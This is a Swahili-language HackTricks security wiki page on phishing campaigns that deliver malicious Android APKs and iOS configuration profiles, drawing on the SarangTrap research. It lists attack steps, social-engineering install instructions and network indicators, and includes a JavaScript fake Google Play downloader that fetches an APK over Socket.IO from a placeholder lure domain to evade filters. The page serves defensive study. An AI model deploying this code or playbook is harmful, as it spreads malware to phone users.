# Phishing ya Simu na Usambazaji wa App Hasidi (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ukurasa huu unaeleza mbinu zinazotumiwa na threat actors kusambaza **Android APKs hasidi** na **iOS mobile-configuration profiles** kupitia phishing (SEO, social engineering, fake stores, dating apps, n.k.).
> Maudhui haya yamechukuliwa kutoka kampeni ya SarangTrap iliyofichuliwa na Zimperium zLabs (2025) pamoja na tafiti nyingine za umma.<sup>[[1]](#references)</sup>

## Mtiririko wa Attack

1. **Miundombinu ya SEO/Phishing**
* Sajili domains kadhaa zinazofanana na halisi (dating, cloud share, car service…).
– Tumia maneno muhimu ya lugha ya eneo na emojis kwenye kipengele cha `<title>` ili kupata nafasi nzuri kwenye Google.
– Host maelekezo ya usakinishaji ya Android (`.apk`) na iOS kwenye landing page moja.
2. **Upakuaji wa Hatua ya Kwanza**
* Android: kiungo cha moja kwa moja cha APK isiyo na signature au APK ya “third-party store”.
* iOS: `itms-services://` au kiungo rahisi cha HTTPS kinachoelekeza kwenye malicious **mobileconfig** profile (tazama hapa chini).
3. **Tabia ya Android Baada ya Usakinishaji**
* Utekelezaji unaodhibitiwa na C2, matumizi mabaya ya permissions, bypasses za dropper, ukusanyaji wa data wa chinichini, na tabia nyingine za malware baada ya usakinishaji zimeelezwa kwenye ukurasa maalum wa Android Malware Post-Exploitation hapa chini.
4. **Mbinu ya Usambazaji ya iOS**
* **mobile-configuration profile** moja inaweza kuomba `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, n.k. ili kusajili kifaa kwenye supervision inayofanana na “MDM”.
* Maelekezo ya social engineering:
1. Fungua Settings ➜ *Profile downloaded*.
2. Bonyeza *Install* mara tatu (screenshots zinaonyeshwa kwenye phishing page).
3. Iamini profile isiyo na signature ➜ attacker hupata entitlement za *Contacts* na *Photo* bila ukaguzi wa App Store.
5. **iOS Web Clip Payload (ikoni ya phishing app)**
* Payloads za `com.apple.webClip.managed` zinaweza **kubandika phishing URL kwenye Home Screen** kwa kutumia ikoni/label yenye branding.
* Web Clips zinaweza kuendeshwa kwenye **full-screen** (huficha UI ya browser) na kuwekwa kuwa **non-removable**, jambo linalomlazimisha victim kufuta profile ili kuondoa ikoni.<sup>[[3]](#references)</sup>
6. **Network Layer**
* HTTP isiyo na encryption, mara nyingi kwenye port 80 ikiwa na HOST header kama `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (hakuna TLS → ni rahisi kuiona).

## Android Malware Post-Exploitation

Kwa tradecraft ya Android malware baada ya usakinishaji kama vile C2, matumizi mabaya ya Accessibility, overlays, ATS automation, staged DEX loading, premium SMS, na persistence, tazama:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling inayotumia Socket.IO/WebSocket + Fake Google Play Pages

Attackers wanazidi kubadilisha static APK links kwa channel ya Socket.IO/WebSocket iliyopachikwa kwenye lures zinazoonekana kama Google Play. Hii huficha payload URL, hupita URL/extension filters, na huhifadhi install UX inayoonekana halisi.<sup>[[2]](#references)[[4]](#references)</sup>

Mtiririko wa kawaida wa client ulioonekana kwenye mazingira halisi:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Kwa nini inakwepa controls rahisi:
- Hakuna static APK URL inayowekwa wazi; payload huundwa upya kwenye memory kutoka kwa WebSocket frames.
- URL/MIME/extension filters zinazozuia majibu ya moja kwa moja ya `.apk` zinaweza kukosa binary data inayopitishwa kupitia WebSockets/Socket.IO.
- Crawlers na URL sandboxes ambazo hazitekelezi WebSockets hazitapata payload.

Tazama pia WebSocket tradecraft na tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Marejeo

- [1] [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan Targeting Indonesian and Vietnamese Android Users](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)

{{#include ../../banners/hacktricks-training.md}}
